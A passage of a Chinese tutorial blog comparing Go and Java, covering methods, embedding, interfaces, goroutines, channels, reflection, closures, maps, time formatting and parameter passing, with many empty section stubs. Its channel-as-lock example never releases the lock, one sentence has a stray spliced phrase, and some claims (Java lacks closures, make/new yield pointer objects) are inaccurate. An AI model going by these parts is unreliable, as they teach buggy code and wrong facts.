中的方法是必须用一个具体的结构体对象来调用的，有点像 Java 的某个类的对象调用其方法 我们可以把指定的函数绑定到对应的结构体上，使该函数成为这个结构体的方法，然后这个结构体的对象就可以通过。来调用这个方法了 绑定的形式是：在 func 和方法名之间写一个 (当前对象变量名 当前结构体类型)，这个叫方法的接受器，其中当前对象的变量名就是当前结构体调用该方法的对象的引用，相当于 java 中的 this 对象。 参考如下示例为 Student 学生添加一个 learn 学习的方法 12345678910111213141516171819202122package mainimport &quot;fmt&quot;type Student struct { num int //学号 name string //姓名 class int //班级 sex bool //性别}//给Student添加一个方法//这里的(stu Student)中的stu相当于java方法中的this对象//stu是一个方法的接收器，接收是哪个对象调用了当方法func (stu Student) learn() { fmt.Printf(&quot;%s学生正在学习&quot;,stu.name)}func main() { stu := Student{1,&quot;li_ming&quot;,10,true} stu.learn()} 方法的接收器也可以是指针类型的 参考如下案例： 123456789101112131415161718192021package mainimport &quot;fmt&quot;type Student struct { num int //学号 name string //姓名 class int //班级 sex bool //性别}//这里方法的接收器也可以是指针类型func (stu *Student) learn() { fmt.Printf(&quot;%s学生正在学习&quot;,stu.name)}func main() { //指针类型 stu := &amp;Student{1,&quot;li_ming&quot;,10,true} stu.learn()} 注意有一种情况，当一个对象为 nil 空时，它调用方法时，接收器接受的对于自身的引用也是 nil，需要我们做一些健壮性的不为 nil 才做的判断处理。 # 3.Go 的继承 (结构体嵌入) Go 中可以用嵌入结构体实现类似于继承的功能： 参考如下代码示例： 12345678910111213141516171819202122232425262728package mainimport &quot;fmt&quot;//电脑type Computer struct { screen string //电脑屏幕 keyboard string //键盘}//计算方法func (cp Computer) compute(num1,num2 int) int{ return num1+num2;}//笔记本电脑type NoteBookComputer struct{ Computer wireless_network_adapter string //无线网卡}func main() { var cp1 NoteBookComputer = NoteBookComputer{} cp1.screen = &quot;高清屏&quot; cp1.keyboard = &quot;防水键盘&quot; cp1.wireless_network_adapter = &quot;新一代无线网卡&quot; fmt.Println(cp1) fmt.Println(cp1.compute(1,2))} 需要注意的是，Go 中可以嵌入多个结构体，但是多个结构体不能有相同的方法，如果有参数和方法名完全相同的方法，在编译的时候就会报错。所以 Go 不存在嵌入多个结构体后，被嵌入的几个结构体有相同的方法，最后不知道选择执行哪个方法的情况，多个结构体方法相同时，直接编译就会报错。 参考如下示例： 12345678910111213141516171819202122232425262728293031package mainimport &quot;fmt&quot;func main() { man := Man{} fmt.Println(man) //下面的代码编译会报错 //man.doEat()}type Man struct { FatherA FatherB}func (p FatherA) doEat() { fmt.Printf(&quot;FatherA eat&quot;)}func (t FatherB) doEat() { fmt.Printf(&quot;FatherB eat&quot;)}type FatherB struct {}type FatherA struct {} # 4.Go 的多态 (接口) 接下来我们讲 Go 中如何通过父类接口指向具体实现类对象，实现多态： go 语言中的接口是非侵入式接口。 java 语言中的接口是侵入式接口。 侵入式接口是指需要显示的在类中写明实现哪些接口。 非侵入式接口是指不要显示的在类中写明要实现哪些接口，只需要方法名同名，参数一致即可。 参考如下代码示例：接口与多态 123456789101112131415161718192021222324252627282930313233343536373839404142package mainimport &quot;fmt&quot;//动物接口type Animal interface{ eat() //吃饭接口方法 sleep() //睡觉接口方法}//小猫type Cat struct {}//小狗type Dog struct {}//小猫吃方法func (cat Cat) eat() { fmt.Println(&quot;小猫在吃饭&quot;)}//小猫睡方法func (cat Cat) sleep(){ fmt.Println(&quot;小猫在睡觉&quot;)}//小狗在吃饭func (dog Dog) eat(){ fmt.Println(&quot;小狗在吃饭&quot;)}//小狗在睡觉func (dog Dog) sleep(){ fmt.Println(&quot;小狗在睡觉&quot;)}func main() { var cat Animal = Cat{} var dog Animal = Dog{} cat.eat() cat.sleep() dog.eat() dog.sleep()} 接口可以内嵌接口 参考如下代码示例： 123456789101112131415package main//内嵌接口//学习接口，内嵌听和看学习接口type Learn interface { LearnByHear LearnByLook}//通过听学习接口type LearnByHear interface { hear()}//通过看学习type LearnByLook interface { look()} # # 23.Go 语言中线程的实现和 Java 语言中线程的实现 go 中的线程相关的概念是 Goroutines (并发)，是使用 go 关键字开启。 Java 中的线程是通过 Thread 类开启的。 在 go 语言中，一个线程就是一个 Goroutines，主函数就是（主） main Goroutines。 使用 go 语句来开启一个新的 Goroutines 比如： 普通方法执行 myFunction() 开启一个 Goroutines 来执行方法 go myFunction() java 中是 new Thread(()-&gt;{ // 新线程逻辑代码 }).start(); 参考下面的代码示例： 12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot;)//并发开启新线程goroutine测试//我的方法func myFunction() { fmt.Println(&quot;Hello!!!&quot;)}//并发执行方法func goroutineTestFunc() { fmt.Println(&quot;Hello!!! Start Goroutine!!!&quot;)}func main() { /* myFunction() //go goroutineTestFunc() //此时因为主线程有时候结束的快，goroutineTestFunc方法得不到输出，由此可以看出是开启了新的线程。 */ //打开第二段执行 /* go goroutineTestFunc() time.Sleep(10*time.Second)//睡一段时间 10秒 myFunction() */} 线程间的通信： java 线程间通信有很多种方式： 比如最原始的 wait/notify 到使用 juc 下高并发线程同步容器，Go 和 Java 关于 Socket 编程的对比同步队列 到 CountDownLatch 等一系列工具类 … 甚至是分布式系统不同机器之间的消息中间件，单机的 disruptor 等等。 Go 语言不同，线程间主要的通信方式是 Channel。 Channel 是实现 go 语言多个线程（goroutines）之间通信的一个机制。 Channel 是一个线程间传输数据的管道，创建 Channel 必须声明管道内的数据类型是什么 下面我们创建一个传输 int 类型数据的 Channel 代码示例： 12345678package mainimport &quot;fmt&quot;func main() { ch := make(chan int) fmt.Println(ch)} channel 是引用类型，函数传参数时是引用传递而不是值拷贝的传递。 channel 的空值和别的应用类型一样是 nil。 == 可以比较两个 Channel 之间传输的数据类型是否相等。 channel 是一个管道，他可以收数据和发数据。 具体参照下面代码示例: 1234567891011121314151617181920212223242526272829303132package mainimport ( &quot;fmt&quot; &quot;time&quot;)//channel发送数据和接受数据用 &lt;-表示,是发送还是接受取决于chan在 &lt;-左边还是右边//创建一个传输字符串数据类型的管道var chanStr = make(chan string)func main() { fmt.Println(&quot;main goroutine print Hello &quot;) //默认channel是没有缓存的，阻塞的，也就是说，发送端发送后直到接受端接受到才会施放阻塞往下面走。 //同样接收端如果先开启，直到接收到数据才会停止阻塞往下走 //开启新线程发送数据 go startNewGoroutineOne() //从管道中接收读取数据 go startNewGoroutineTwo() //主线程等待，要不直接结束了 time.Sleep(100*time.Second)}func startNewGoroutineOne() { fmt.Println(&quot;send channel print Hello &quot;) //管道发送数据 chanStr &lt;- &quot;Hello!!!&quot;}func startNewGoroutineTwo(){ fmt.Println(&quot;receive channel print Hello &quot;) strVar := &lt;-chanStr fmt.Println(strVar)} 无缓存的 channel 可以起到一个多线程间线程数据同步锁安全的作用。 缓存的 channel 创建方式是 make (chan string, 缓存个数) 缓存个数是指直到多个数据没有消费或者接受后才进行阻塞。 类似于 java 中的 synchronized 和 lock 可以保证多线程并发下的数据一致性问题。 首先我们看一个线程不安全的代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport ( &quot;fmt&quot; &quot;time&quot;)//多线程并发下的不安全问题//金额var moneyA int =1000//添加金额func subtractMoney(subMoney int) { time.Sleep(3*time.Second) moneyA-=subMoney}//查询金额func getMoney() int { return moneyA;}func main() { //添加查询金额 go func() { if(getMoney()&gt;200) { subtractMoney(200) fmt.Printf(&quot;200元扣款成功，剩下：%d元\\n&quot;,getMoney()) } }() //添加查询金额 go func() { if(getMoney()&gt;900) { subtractMoney(900) fmt.Printf(&quot;900元扣款成功，剩下：%d元\\n&quot;,getMoney()) } }() //正常逻辑，只够扣款一单，可以多线程环境下结果钱扣多了 time.Sleep(5*time.Second) fmt.Println(getMoney())} 缓存为 1 的 channel 可以作为锁使用： 示例代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package mainimport ( &quot;fmt&quot; &quot;time&quot;)//多线程并发下使用channel改造//金额var moneyA = 1000//减少金额管道var synchLock = make(chan int,1)//添加金额func subtractMoney(subMoney int) { time.Sleep(3*time.Second) moneyA-=subMoney}//查询金额func getMoney() int { return moneyA;}func main() { //添加查询金额 go func() { synchLock&lt;-10 if(getMoney()&gt;200) { subtractMoney(200) fmt.Printf(&quot;200元扣款成功，剩下：%d元\\n&quot;,getMoney()) } &lt;-synchLock }() //添加查询金额 go func() { synchLock&lt;-10 if(getMoney()&gt;900) { subtractMoney(900) fmt.Printf(&quot;900元扣款成功，剩下：%d元\\n&quot;,getMoney()) } synchLock&lt;-10 }() //这样类似于java中的Lock锁，不会扣多 time.Sleep(5*time.Second) fmt.Println(getMoney())} go 也有互斥锁 类似于 java 中的 Lock 接口 参考如下示例代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package mainimport ( &quot;fmt&quot; &quot;sync&quot; &quot;time&quot;)//多线程并发下使用channel改造//金额var moneyA = 1000var lock sync.Mutex;//添加金额func subtractMoney(subMoney int) { lock.Lock() time.Sleep(3*time.Second) moneyA-=subMoney lock.Unlock()}//查询金额func getMoney() int { lock.Lock() result := moneyA lock.Unlock() return result;}func main() { //添加查询金额 go func() { if(getMoney()&gt;200) { subtractMoney(200) fmt.Printf(&quot;200元扣款成功，剩下：%d元\\n&quot;,getMoney()) }else { fmt.Println(&quot;余额不足，无法扣款&quot;) } }() //添加查询金额 go func() { if(getMoney()&gt;900) { subtractMoney(900) fmt.Printf(&quot;900元扣款成功，剩下：%d元\\n&quot;,getMoney()) }else { fmt.Println(&quot;余额不足，无法扣款&quot;) } }() //正常 time.Sleep(5*time.Second) fmt.Println(getMoney())} # 24.Go 中的反射与 Java 中的反射对比 整体概述：反射是一个通用的概念，是指在程序运行期间获取到变量或者对象，结构体的元信息，比如类型信息，并且能够取出其中变量的值，调用对应的方法。 首先我们先来回顾一下 Java 语言用到反射的场景有哪些？ 1. 比如说我们的方法参数不能确定是什么类型，是 Object 类型，我们就可以通过反射在运行期间获取其真实的类型，然后做对应的逻辑处理。 2. 比如动态代理，我们需要在程序运行时，动态的加载一个类，创建一个类，使用一个类。 3. 比如在想要强行破解获取程序中被 private 的成员。 4.Java 的各种框架中用的非常多，框架中用反射来判断用户自定义的类是什么类型，然后做区别处理。 Go 中的反射大概也是相同的，比如，go 中有一个类型 interface,interface 类型相当于 Java 中的 Object 类，当以 interface 作为参数类型时，可以给这个参数传递任意类型的变量。 例如示例 1： 12345678910111213package mainimport &quot;fmt&quot;func main() { testAllType(1); testAllType(&quot;Go&quot;);}//interface{}代表任意类型func testAllType (data interface{}){ fmt.Println(data)} 那么第一种应用场景就出现了，当我们在 go 中想实现一个函数 / 方法，这个函数 / 方法的参数类型在编写程序的时候不能确认，在运行时会有各种不同的类型传入这个通用的函数 / 方法中，我们需要对不同类型的参数做不同的处理，那么我们就得能获取到参数是什么类型的，然后根据这个类型信息做业务逻辑判断。 反射我们需要调用 reflect 包模块，使用 reflect.typeOf () 可以获取参数的类型信息对象，再根据类型信息对象的 kind 方法，获取到具体类型，详细参考下面代码。 例如示例 2： 12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot; &quot;reflect&quot;)func main() { handleType(1) handleType(true)}func handleType(data interface{}) { //获取类型对象 d := reflect.TypeOf(data) //kind方法是获取类型 fmt.Println(d.Kind()) switch d.Kind() { case reflect.Invalid: //无效类型逻辑处理 fmt.Println(&quot;无效类型&quot;) case reflect.Int,reflect.Int8,reflect.Int16,reflect.Int32,reflect.Int64: fmt.Println(&quot;整形&quot;) case reflect.Bool: fmt.Println(&quot;bool类型&quot;) } }因为传入进来的都是interface类型，所以我们需要用的时候要区分类型，然后取出其中真正类型的值。 反射取出值得方法就是先通过 reflect.ValueOf () 获取参数值对象，然后再通过不同的具体方法获取到值对象，比如 int 和 bool 示例 3： 123456789101112131415161718192021222324252627282930313233package mainimport ( &quot;fmt&quot; &quot;reflect&quot;)func main() { handleValue(1) handleValue(true)}func handleValue(data interface{}) { //获取类型对象 d := reflect.ValueOf(data) //kind方法是获取类型 fmt.Println(d.Kind()) switch d.Kind() { case reflect.Invalid: //无效类型逻辑处理 fmt.Println(&quot;无效类型&quot;) case reflect.Int,reflect.Int8,reflect.Int16,reflect.Int32,reflect.Int64: //取出值 var myNum = d.Int() fmt.Println(myNum) case reflect.Bool: //取出bool值 var myBool = d.Bool() fmt.Println(myBool) }} 结构体中的属性和方法怎么获取呢？ 获取结构体属性的个数是先 ValueOf 获取结构体值对象 v 后，用 v.NumField () 获取该结构体有几个属性，通过 v.Field (i) 来获取对应位置的属性的元类型。 示例代码 4： 后续反射还有几个 api 和代码示例和具体应用场景，正在补。。。 # 25. 变量作用域的区别 Go 语言的变量作用域和 Java 中的一样，遵循最近原则，逐渐往外层找。 这个比较简单，就不做过多赘述了。 # 26.Go 语言和 Java 语言字符串操作的区别 # 27.Go 语言和 Java 语言 IO 操作的区别 # 28.Go 语言中有匿名函数，有闭包，Java 中没有 (高阶函数用法) 函数也是一种类型，它可以作为一个参数进行传递，也可以作为一个返回值传递。 Go 中可以定义一个匿名函数，并把这个函数赋值给一个变量 示例 1： 匿名函数赋值给变量 12345678910111213package mainimport &quot;fmt&quot;//定义一个匿名函数并赋值给myFun变量var myFun = func(x,y int) int { return x+y}func main() { //调用myFun fmt.Println(myFun(1,2))} 输出结果： 13 Go 的函数内部是无法再声明一个有名字的函数的，Go 的函数内部只能声明匿名函数。 示例 2： 1234567891011121314151617181920212223242526272829package mainimport &quot;fmt&quot;func main() { myFunc3()}func myFun1() { /*此处报错，函数内部不能声明带有名称的函数 func myFunc2() { } */}func myFunc3() { //函数内部可以声明一个匿名函数，并把这个匿名函数赋值给f变量 var f = func() { fmt.Println(&quot;Hi,boy!&quot;) } //调用f f() //如果不想赋值给变量，那就必须在最后加上(),表示立即执行 func() { fmt.Println(&quot;Hello,girl!&quot;) }()//有参数可以写在这个小括号中} 输出： 12Hi,boy!Hello,girl! Go 中有闭包的功能。(闭包是一个通用的编程概念，一些语言有，一些没有，javascript 中就有这个概念，Java 中没有) 闭包，通俗易懂的讲，就是你有一个 A 函数，A 函数有一个 a 参数，然后在 A 函数内部再定义或者调用或者写一个 B 函数，这个 B 函数叫做闭包函数。B 函数内部的代码可以访问它外部的 A 函数的 a 参数，正常 A 函数调用返回完毕，a 参数就不能用了，可是闭包函数 B 函数仍然可以访问这个 a 参数，B 函数能不受 A 函数的调用生命周期限制可以随时访问其中的 a 参数，这个能访问的状态叫做已经做了闭包，闭包闭的是把 a 参数封闭到了 B 函数中，不受 A 函数的限制。 也就是说，我们用程序实现一个闭包的功能，实质上就是写一个让外层的函数参数或者函数内变量封闭绑定到内层函数的功能。 接下来我们看代码示例： 12345678910111213141516171819202122package mainimport &quot;fmt&quot;//我们来看看实现闭包func main() { var f = f1(100) f(100) //print 200 f(100) //print 300 f(100) //print 400}func f1(x int) func(int){ //此时即使f1函数执行完毕，x也不会消失 //x在func(y int)这个函数内一直存在并且叠加， //这里把x的值封闭到func(y int)这个返回函数中，使其函数一直能使用x的值 //就叫做闭包，把x变量封闭到fun(y int)这个函数包内。 return func(y int){ x+=y fmt.Printf(&quot;x=%d\\n&quot;,x) }} 输出： 123x=200x=300x=400 做下闭包的总结，如何实现一个闭包： 1. 定义一个 A 函数，此函数返回一个匿名函数。（定义一个返回匿名函数的 A 函数） 2. 把在 A 函数的 b 参数或 A 函数代码块中的 b 变量，放入匿名函数中，进行操作。 3. 这样我们调用 A 函数返回一个函数，这个函数不断的调用就可以一直使用之前 b 参数，b 变量，并且 b 值不会刷新，有点像在匿名函数外部自定义了一个 b 的成员变量（成员变量取自 Java 中类的相关概念） # 29.Go 中的 map 和 Java 中的 HashMap Go 中的 map 也是一个存储 key-value，键值对的这么一种数据结构。 我们来看下如何使用： 如何创建一个 map?(map 是引用类型，默认值是 nil，必须用 make 为其创建才能使用) 创建一个 map 必须要用 make，否则会是 nil 格式为: make (map [key 类型] value 类型) (下面有代码示例) 往 Go 中的 map 赋值添加元素用 【 map 变量名称 [key] = value 】 的方式 示例 1：创建 map 以及添加元素 12345678910111213141516package mainimport &quot;fmt&quot;func main() { //创建一个map必须要用make，否则会是nil //格式为: make(map[key类型]value类型) //Java中: Map&lt;String,Integer&gt; myMap = new HashMap&lt;&gt;(); myMap := make(map[string]int) //往Go中的map赋值添加元素用 【 map变量名称[key] = value 】 的方式 //区别于Java中的: myMap.put(&quot;li_age&quot;,20); myMap[&quot;li_age&quot;] = 20 myMap[&quot;hong_age&quot;] = 30 //打印一下map fmt.Println(myMap)} 我们从 map 中取值得格式为： 【 mapValue := map 变量名 [key]】 当我们填写的 key 在 map 中找不到时返回对应的 value 默认值，int 是 0，引用类型是 nil 当我们的 key 取不到对应的值，而 value 的类型是一个 int 类型，我们如何判断这个 0 是实际值还是默认值呢 此时我们需要同时取两个值 通过 map 的 key 取出两个值，第二个参数为 bool 类型，false 为该值不存在，true 为成功取到值 参考下面： 示例 2：从 map 中取值 12345678910111213141516171819202122232425262728package mainimport &quot;fmt&quot;func main() { //创建一个map必须要用make，否则会是nil //格式为: make(map[key类型]value类型) //Java中: Map&lt;String,Integer&gt; myMap = new HashMap&lt;&gt;(); myMap := make(map[string]int) //往Go中的map赋值添加元素用 【 map变量名称[key] = value 】 的方式 //区别于Java中的: myMap.put(&quot;li_age&quot;,20); myMap[&quot;li_age&quot;] = 20 myMap[&quot;hong_age&quot;] = 30 //打印一下map fmt.Println(myMap) //不存在的值 fmt.Println(myMap[&quot;no&quot;]) //当我们的key取不到对应的值，而value的类型是一个int类型，我们如何判断这个0是实际值还是默认值呢 //此时我们需要同时取两个值 //通过map的key取出两个值，第二个参数为bool类型，false为该值不存在，true为成功取到值 value,existsValue := myMap[&quot;no&quot;] if !existsValue { fmt.Println(&quot;此值不存在&quot;) } else { fmt.Printf(&quot;value = %d&quot;,value) }} Go 中因为返回值可以是两个，所以的 map 遍历很简单，不像 java 还得弄一个 Iterator 对象再逐个获取，它一次两个都能取出来，用 for 搭配 range 即可实现。 示例 3：遍历 12345678910111213141516171819202122232425package mainimport &quot;fmt&quot;func main() { myMap := make(map[string]int) myMap[&quot;num1&quot;] = 1 myMap[&quot;num2&quot;] = 2 myMap[&quot;num3&quot;] = 3 myMap[&quot;num4&quot;] = 4 myMap[&quot;num5&quot;] = 5 myMap[&quot;num6&quot;] = 6 //遍历key,value for key,value := range myMap { fmt.Println(key,value) } //写一个参数的时候只取key for key := range myMap { fmt.Println(key) } //如果只想取value，就需要用到之前的_标识符进行占位丢弃 for _,value := range myMap { fmt.Println(value) }} 删除函数：用内置函数 delete 删除 示例 4：删除 map 元素 1234567891011121314151617package mainimport &quot;fmt&quot;func main() { myMap := make(map[string]int) myMap[&quot;num1&quot;] = 1 myMap[&quot;num2&quot;] = 2 myMap[&quot;num3&quot;] = 3 myMap[&quot;num4&quot;] = 4 myMap[&quot;num5&quot;] = 5 myMap[&quot;num6&quot;] = 6 //第二个参数为删除的key delete(myMap,&quot;num6&quot;) //此时已经没有值了，默认值为0 fmt.Println(myMap[&quot;num6&quot;])} 在 Java 中有一些复杂的 Map 类型，比如： 12Map&lt;String,Map&lt;String,Object&gt;&gt; data = new HashMap&lt;&gt;();1 实际上，在 Go 语言中，也有复杂的类型，我们举几个代码示例 示例 5： 12345678910111213141516171819202122232425262728package mainimport &quot;fmt&quot;func main() { //由map组成的切片 //第一部分 make[] 声明切片 //第二部分 map[string]int 声明该切片内部装的单个类型是map //第三部分 参数 5 表示该切片的长度和容量都是5 //长度是用索引能取到第几个元素，索引不能超过长度-1，分配长度后都是默认值，int是0，引用类型是nil //容量至少比长度大，能索引到几个+未来可添加元素个数(目前没有任何东西，看不见)= 切片容量 //make([]切片类型,切片长度，切片容量) //make([]切片类型,切片长度和容量等同) slice := make([]map[string]int,5,10) slice0 := make([]map[string]int,0,10) //我们看看打印的东西 fmt.Println(&quot;slice=&quot;,slice) fmt.Println(&quot;slice=0&quot;,slice0) ///* 先看这段 //因为有5个长度，所以初始化了5个map，但是map没有通过make申请内容空间，所以报错nil map //slice[0][&quot;age&quot;] = 10;//报错 //下面不报错 slice[0] = make(map[string]int,10) slice[0][&quot;age&quot;] = 19 fmt.Println(slice[0][&quot;age&quot;]) //*/} 输出结果： 1234slice= [map[] map[] map[] map[] map[]]slice=0 []19123 接下来继续看代码： 123456789101112131415161718192021222324252627282930package mainimport &quot;fmt&quot;func main() { //由map组成的切片 //第一部分 make[] 声明切片 //第二部分 map[string]int 声明该切片内部装的单个类型是map //第三部分 参数 5 表示该切片的长度和容量都是5 //长度是用索引能取到第几个元素，索引不能超过长度-1，分配长度后都是默认值，int是0，引用类型是nil //append元素到切片时，是添加到最末尾的位置，当元素未超过容量时，都是用的同一个底层数组 //超过容量时会返回一个新的数组 //make([]切片类型,切片长度，切片容量) //make([]切片类型,切片长度和容量等同) slice := make([]map[string]int,5,10) slice0 := make([]map[string]int,0,10) //我们看看打印的东西 fmt.Println(&quot;slice=&quot;,slice) fmt.Println(&quot;slice=0&quot;,slice0) /* 先看这段 //因为有5个长度，所以初始化了5个map，但是map没有通过make申请内容空间，所以报错nil map //slice[0][&quot;age&quot;] = 10;//报错 //下面不报错 slice[0] = make(map[string]int,10) slice[0][&quot;age&quot;] = 19 fmt.Println(slice[0][&quot;age&quot;]) */} 输出： 1panic: assignment to entry in nil map 看下面这个报错： 12345678910111213141516171819202122232425262728293031323334package mainimport &quot;fmt&quot;func main() { //由map组成的切片 //第一部分 make[] 声明切片 //第二部分 map[string]int 声明该切片内部装的单个类型是map //第三部分 参数 5 表示该切片的长度和容量都是5 //长度是用索引能取到第几个元素，索引不能超过长度-1，分配长度后都是默认值，int是0，引用类型是nil //append元素到切片时，是添加到最末尾的位置，当元素未超过容量时，都是用的同一个底层数组 //超过容量时会返回一个新的数组 //make([]切片类型,切片长度，切片容量) //make([]切片类型,切片长度和容量等同) slice := make([]map[string]int,5,10) slice0 := make([]map[string]int,0,10) //我们看看打印的东西 fmt.Println(&quot;slice=&quot;,slice) fmt.Println(&quot;slice=0&quot;,slice0) /* 先看这段 //因为有5个长度，所以初始化了5个map，但是map没有通过make申请内容空间，所以报错nil map //slice[0][&quot;age&quot;] = 10;//报错 //下面不报错 slice[0] = make(map[string]int,10) slice[0][&quot;age&quot;] = 19 fmt.Println(slice[0][&quot;age&quot;]) */ ///* //因为初始化了0个长度，所以索引取不到值，报index out of range slice0[0][&quot;age&quot;] = 10; //*/} 输出： 1slice= [mappanic: runtime error: index out of range 接下来我们看一个：类似于 Java 中常用的 map 类型 1234567891011121314package mainimport &quot;fmt&quot;func main() { //类似于Java中的Map&lt;String,HashMap&lt;String,Object&gt;&gt; var myMap = make(map[string]map[string]interface{},10) fmt.Println(myMap) //记得make myMap[&quot;li_ming_id_123&quot;] = make(map[string]interface{},5) myMap[&quot;li_ming_id_123&quot;][&quot;school&quot;] = &quot;清华大学&quot; fmt.Println(myMap)} 输出： 12map[]map[li_ming_id_123:map[school:清华大学]] # 30.Go 中的 time 时间包模块和 Java 中的时间 API 使用区别 Go 中关于时间处理的操作在 time 包中 1. 基本获取时间信息 参考如下代码示例： 1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( &quot;fmt&quot; &quot;time&quot;)func main() { //获取当前时间 now := time.Now() //获取当前年份 year := now.Year() //获取当前月份 month := now.Month() //获取当前 日期 day := now.Day() //获取当前小时 hour := now.Hour() //获取当前分钟 min := now.Minute() //获取当前秒 second :=now.Second() //获取当前时间戳，和其它编程语言一样，自1970年算起 timestamp := now.Unix() //纳秒时间戳 ntimestamp := now.UnixNano() fmt.Println(&quot;year=&quot;,year) fmt.Println(&quot;month=&quot;,month) fmt.Println(&quot;day=&quot;,day) fmt.Println(&quot;hour=&quot;,hour) fmt.Println(&quot;min=&quot;,min) fmt.Println(&quot;second=&quot;,second) fmt.Println(&quot;timestamp=&quot;,timestamp) fmt.Println(&quot;ntimestamp=&quot;,ntimestamp)} 2. 格式化时间 Go 的时间格式化和其它语言不太一样，它比较特殊，取了 go 的出生日期作为参数标准 参考如下代码示例： 1234567891011121314151617package mainimport ( &quot;fmt&quot; &quot;time&quot;)func main() { //获取当前时间 now := time.Now() //2006-01-02 15:04:05这个数值是一个标准写死的，只要改格式符号即可 fmt.Println(now.Format(&quot;2006-01-02 15:04:05&quot;)) fmt.Println(now.Format(&quot;2006/01/02 15:04:05&quot;)) fmt.Println(now.Format(&quot;2006/01/02&quot;))//年月日 fmt.Println(now.Format(&quot;15:04:05&quot;))//时分秒} # 31.Go 和 Java 关于 Socket 编程的对比 # 32. 聊聊 Go 语言如何连接 Mysql 数据库 # 33. 聊聊 Go 语言如何使用 Redis # 34.Go 中的依赖管理–Module, 对比 Java 的 maven # 35.Go 的协程高并发支持与 Java 的区别 # 36.Go 的性能调优和 Java 的性能调优 # 37.Go 的测试 API 与 Java 的单元测试 # 38. 自定义类型 Type # 39.Go 的参数值传递与引用传递 接下来我们讲一下 Go 中的参数传递原理。 关于参数传递是一个什么概念呢，参数传递相关的知识是在研究当调用一个函数时，把外部的一个变量传入函数内，在函数内修改这个参数是否会对外部的参数变量的值有影响。参数传递用在的一个地方是函数的参数传递。（还有方法的接收器参数传递） 比如李明今天没有写作业，到了学校后匆匆忙忙的找小红要作业本 (小红的作业本为方法调用处传入的参数)，想要抄一抄补上，所以李明有一个抄作业的任务 (抄作业的任务为函数)，那么他有两个选择可以完成抄作业的任务。 第一个是直接拿过来小红的作业本开始抄，这在函数中叫做引用传递，因为如果小明抄的时候不小心桌子上的水打翻了，弄湿了小红的作业本，小红的作业本就真湿了，没法交了。 第二个是用打印机把小红的作业打印一份，然后拿着打印的那份抄，这叫做值传递，也就是说我拷贝一份值来用，那么我在抄作业 (任务函数内) 无论怎么弄湿小红的作业本，小红真正的自己的作业本也不受到影响。 在编程语言的函数中，如果是值传递，则是一个拷贝，在方法内部修改该参数值无法对其本身造成影响，如果是引用传递的概念，则可以改变其对象本身的值。 在 Go 语言中只有值传递，也是是说，无论如何 Go 的参数传递的都是一个拷贝。 重点来了： Go 中的值传递有两种类型，如下： 1. 第一种值传递是具体的类型对象值传递，可能是 int,string,struct 之类的。 1在此时，如果我们要自定义一个struct类型，传入参数中，可能遇到一个坑，因为是值传递，所以会拷贝一个struct对象，如果这个对象占内存比较大，而且这个函数调用频繁，会大量的拷贝消耗性能资源。 2. 第二种传递是叫指针参数类型的值传递，此时参数是一个指针类型，到具体的方法中，我们的参数也要用指针类型的参数接受，但是此时 Go 语言的内部做了一个黑箱操作。 举例 (下面还有完整可执行代码示例，先文字和伪代码举例)： 我们有一个类型为 Boy 的结构体，还有一个方法 Mod 123func Mod(b *Boy){} 这个 Mod 方法的参数是一个指针类型的 Boy 对象， 我们要调用的时候应该这样传参数： 123var boy = Boy{} //用&amp;取boy对象的指针地址，然后传入Mod方法Mod(&amp;boy) 我们看看下面的代码示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package mainimport &quot;fmt&quot;// Boy 结构体type Boy struct { name string age int}func Mod(b *Boy) { //这个是获取调用方法传入的参数的地址值 fmt.Printf(&quot;b的值(之前boy的地址)是%p\\n&quot;,b) //这个是获取本函数中 b这个指针变量的地址 fmt.Printf(&quot;b这个指针自己的地址是=%p\\n&quot;,&amp;b) //打印值 //这里自动转换使指针可以直接点出来属性 fmt.Println(b.name,b.age)}func main() { boy := Boy{&quot;li_ming&quot;,20} fmt.Printf(&quot;main函数中的boy地址是:%p\\n&quot;,&amp;boy) //将boy的地址 放入Mod函数的参数中 Mod(&amp;boy) //注意！！！下面有黑箱操作： /* //在&amp;boy并放入Mod传递的过程中实际上做了如下黑箱操作 b := new(Boy) //创建一个名为b的类型为Boy的指针变量 b = &amp;boy //把boy的地址存入b这个指针变量内 //接着把b放入func Mod(b *Boy)的参数中，然后，开始执行Mod方法。 fmt.Println(b.name,b.age) fmt.Printf(&quot;b的地址是:%p\\n&quot;,&amp;b) fmt.Printf(&quot;b的值是:%p\\n&quot;,b) //输出结果 //main函数中的boy地址是:0x10aec0c0 //li_ming 20 //b的地址是:0x10ae40f8 //b的值是:0x10aec0c0 */ /*//以下代码无用，是指为了加深理解new，可以试试输出结果 boy2 := new(Boy) fmt.Printf(&quot;main函数中new的boy2地址是:%p\\n&quot;,boy2) boy2.name = &quot;xiaohong&quot; boy2.age = 18 Mod(boy2) */} 所以，Go 中的参数传递所有的都是值传递， 只不过值传递中，值可以是指针类型，是创建了一个新的指针存储原来参数 (这个参数是原对象的地址) 的值。 所以你用原对象的地址改它的属性，是有点类似于引用类型传递的效果的。 为啥说指针类型也是值传递，因为他还是创建了一个新的指针对象，值传递就是拷贝，拷贝就得创建对象，只不过这个新的指针变量存储的值是原来的参数对象的地址。 最后总结一下： 1.Go 的参数传递都是值传递。 2. 指针类型的值传递可以改变原来对象的值。 3.make 和 new 从底层原理上创建的所有对象都是指针对象，所以 make 和 new 创建出来的 slice,map,chan 或者其它任何对象都是指针传递，改变值后都可以使原来的对象属性发生变化。 # 40. 结构体转 JSON # 41.Go 如何搭建 HTTP-Server # 42.Go 如何搭建 HTTP-Client # 43.Go 如何设置使用的 CPU 个数 Go 语言天生支持高并发，其中一个体现就是如果你的 Go 程序不设置并发时使用的最大 cpu 核数的话，在高并发情况下 Go 会自动把所有 CPU 都用上，跑满。 123456拓展阅读：我们简单理解一下cpu（懂得可以跳过） 举例：比如有一个专门做财务的公司(计算机)，他们的赚钱业务很简单(计算机工作)，就是帮别人做算术题(计算机工作的具体任务)，加减乘除之类的算术题，现在公司有4个员工(物理意义上的4个cpu核数)，有4本算数书(4个进程)，每本书有10道题(线程)，一共有40道算术题要算(40个线程任务)，于是4个人一起干活，在同一时间，有4道算术题被计算，最后大致上每个人算了10道算数题。 